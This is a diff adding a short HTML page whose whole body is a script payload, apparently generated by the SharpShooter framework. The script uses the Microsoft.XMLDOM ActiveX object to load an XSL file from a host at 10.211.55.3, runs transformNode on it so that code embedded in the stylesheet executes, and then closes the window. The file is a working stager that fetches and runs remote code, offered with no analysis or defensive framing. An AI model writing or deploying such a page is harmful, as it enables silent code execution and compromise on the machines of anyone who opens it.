@@ -1,0 +1,15 @@
+<HTML>
+<HEAD>
+</HEAD>
+<BODY>
+<script language="javascript" >
+var xml = new ActiveXObject("Microsoft.XMLDOM");
+xml.async = false;
+var xsl = xml;
+xsl.load("http://10.211.55.3:9000/SharpShooter/output/foo2.xsl");
+xml.transformNode(xsl);
+self.close();
+</script>
+</body>
+</html>
+	
